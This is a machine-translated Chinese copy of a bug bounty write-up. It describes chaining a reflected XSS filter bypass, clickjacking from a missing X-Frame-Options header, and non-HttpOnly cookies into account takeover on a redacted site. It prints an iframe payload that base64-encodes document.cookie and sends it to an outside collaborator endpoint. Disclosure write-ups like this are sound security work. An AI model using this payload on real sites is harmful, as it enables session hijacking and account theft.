<html>
<head>
<title>Chain of Low Level Bugs and Misconfigurations Leads to Account Takeover</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">低级错误和错误配置链导致帐户被接管</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/chain-of-low-level-bugs-and-misconfigurations-leads-to-account-takeover-de248fc4e481?source=collection_archive---------2-----------------------#2021-03-10">https://infosecwriteups.com/chain-of-low-level-bugs-and-misconfigurations-leads-to-account-takeover-de248fc4e481?source=collection_archive---------2-----------------------#2021-03-10</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><p id="edb9" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">你好，猎人们。我要告诉你一个关于我最近发现的故事，在这个故事中，我能够将导致我<strong class="jw ir">接管</strong>任何账户的几个错误配置串联起来。我将把这个网站称为<strong class="jw ir">“rededited . com”</strong>，因为它是HackerOne上的一个私人程序。让我们开始吧。</p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="gh gi ks"><img src="../Images/50e0127398979a7ac8b8a1c9ae21f234.png" data-original-src="https://miro.medium.com/v2/resize:fit:1242/format:webp/1*cesziBtszx934rBSbblPJQ.jpeg"/></div></figure></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><h1 id="7bdc" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">步骤1 —反射XSS</h1><p id="5bf7" class="pw-post-body-paragraph ju jv iq jw b jx ly jz ka kb lz kd ke kf ma kh ki kj mb kl km kn mc kp kq kr ij bi translated">我在我的目标的子域中导航，在深入应用程序之前寻找有趣的功能。过了一会儿，我偶然发现了一个页面，可以让我通过标题搜索一篇博客文章。简而言之，这是一个经典的搜索框。我注意到，每次我在搜索框中输入一些文本，它都会以path的形式反映到URL:</p><blockquote class="md me mf"><p id="862f" class="ju jv mg jw b jx jy jz ka kb kc kd ke mh kg kh ki mi kk kl km mj ko kp kq kr ij bi translated">sub.redacted.com/search/{TEXT_HERE}</p></blockquote><p id="7535" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">正如我们大多数人会做的那样，我立即扔掉了几个XSS有效载荷，但没有运气，我的有效载荷正在被消毒。这似乎是一个定制的旁路系统，没有任何晶圆的迹象。这就是为什么我决定深入研究，并试图绕过消毒。经过多次试验和错误，当我把<strong class="jw ir">小于号'&lt; ' </strong>替换成它的HTML实体形式也就是<strong class="jw ir">&amp;lt；</strong>我的有效载荷成功发射。</p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi mk"><img src="../Images/10966ca38876d31714c48e5847ceeacc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fwMukjc30l_37Gmi-7Av_Q.png"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">XSS有效载荷成功发射</figcaption></figure></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><h1 id="92b5" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">第2步—单击劫持</h1><p id="0c48" class="pw-post-body-paragraph ju jv iq jw b jx ly jz ka kb lz kd ke kf ma kh ki kj mb kl km kn mc kp kq kr ij bi translated">一切似乎都运转得天衣无缝，对吗？不完全是。我期望当我点击链接时有效负载会被触发，但是它没有。搜索文本就在我输入的地方，但它没有被触发。受害者必须手动点击“搜索”按钮才能发射有效载荷。我在Burp Suite中查看了我的日志，发现有一个适当的CSRF保护机制。我尝试了很多方法试图绕过它，但我无法成功。在我的日志中来回查看时，我注意到<strong class="jw ir">“X-Frame-Options”</strong>丢失了，这意味着子域容易被点击劫持，这意味着该站点可以嵌入到任何带有iframe的站点中。</p></div><div class="ab cl jn jo hu jp" role="separator"><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js jt"/><span class="jq bw bk jr js"/></div><div class="ij ik il im in"><h1 id="4f58" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">步骤3 —提高影响力并执行ATO</h1><p id="f559" class="pw-post-body-paragraph ju jv iq jw b jx ly jz ka kb lz kd ke kf ma kh ki kj mb kl km kn mc kp kq kr ij bi translated">一切都很好，但影响力不够高。在考虑提高影响的方法时，我意识到cookies缺少HttpOnly标志，这意味着可以使用JavaScript访问它们。</p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="gh gi mt"><img src="../Images/a577d08db3937f8283216da55c6406bc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/1*R8VmSFCx5J7cQfODcNbAHA.jpeg"/></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">愉快的</figcaption></figure><p id="4462" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">我用它将受害者的cookie作为查询参数附加到URL的末尾。更多细节见下文。我在我的网站上托管的最终有效载荷看起来差不多是这样的:</p><blockquote class="md me mf"><p id="310b" class="ju jv mg jw b jx jy jz ka kb kc kd ke mh kg kh ki mi kk kl km mj ko kp kq kr ij bi translated"><br/>&lt;html&gt;<br/>T22】iframe src =<strong class="jw ir">https://sub.redacted.com/search/&amp;lt；% 20 img % 20 src = x % 20 on error = location . href = % 22 https:% 26 sol；% 26sol{ COLLABORATOR _ URL } % 26sol% 26questq = % 22+btoa(document . cookie)；% 26gt</strong>&gt;<br/>&lt;/iframe&gt;<br/>&lt;/html&gt;<br/><br/>以上URL的解码版本:<br/><strong class="jw ir">https://sub.redacted.com/search/&lt;img src = x on error = location . href = "</strong><a class="ae mu" href="https://d79c170ccad4ecc884e9f75146461d2d.m.pipedream.net/?q=" rel="noopener ugc nofollow" target="_blank"><strong class="jw ir">【COLLABORATOR _ URL }/？q =</strong></a><strong class="jw ir">"+btoa(document . cookie)；&gt; </strong></p></blockquote><p id="203e" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">不过，这一步需要详细说明。</p><h2 id="f8af" class="mv lb iq bd lc mw mx dn lg my mz dp lk kf na nb lo kj nc nd ls kn ne nf lw ng bi translated">btoa()是什么？</h2><p id="2f66" class="pw-post-body-paragraph ju jv iq jw b jx ly jz ka kb lz kd ke kf ma kh ki kj mb kl km kn mc kp kq kr ij bi translated">在JavaScript中，btoa()基本上是一种用base64编码字符串的方法。我为什么需要这个？嗯，我没打算这么做。在飞行中，我意识到我看不到所有的cookie，因为cookie中的一些字符被过滤了。这样，当我检查我的服务器日志时，我能够检索base64编码形式的所有cookies。</p><h2 id="3294" class="mv lb iq bd lc mw mx dn lg my mz dp lk kf na nb lo kj nc nd ls kn ne nf lw ng bi translated">执行接管</h2><p id="4f04" class="pw-post-body-paragraph ju jv iq jw b jx ly jz ka kb lz kd ke kf ma kh ki kj mb kl km kn mc kp kq kr ij bi translated">我不打算详细解释如何进行点击劫持攻击。理解让用户点击一个按钮是小菜一碟就足够了。当受害者点击按钮时，我们得到base64值。</p><p id="639b" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">现在怎么办？我是否只需解码该值，用我的cookies替换它，工作就完成了？的确如此。</p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi nh"><img src="../Images/686d320759217f9f4ad01776c4d86d6e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ECwZXkl08TH0UEhqi69e-Q.jpeg"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">干杯。</figcaption></figure><h1 id="ad65" class="la lb iq bd lc ld ni lf lg lh nj lj lk ll nk ln lo lp nl lr ls lt nm lv lw lx bi translated">外卖食品</h1><ul class=""><li id="846c" class="nn no iq jw b jx ly kb lz kf np kj nq kn nr kr ns nt nu nv bi translated">当您设法找到一个反射的XSS时，尝试通过将它与其他错误(如CSRF、缓存中毒等)联系起来来升级严重性。)</li><li id="bf32" class="nn no iq jw b jx nw kb nx kf ny kj nz kn oa kr ns nt nu nv bi translated">低级错误和错误配置可能会在增加影响方面发挥关键作用，即使它们在报告时几乎没有价值。不要忽视他们！</li></ul><p id="fe52" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">这是我的第一篇文章。我希望这能对你有所帮助。</p><p id="2e62" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">你可以在推特上关注我。<a class="ae mu" href="https://twitter.com/pleorqy" rel="noopener ugc nofollow" target="_blank"> @pleorqy </a></p></div></div>    
</body>
</html>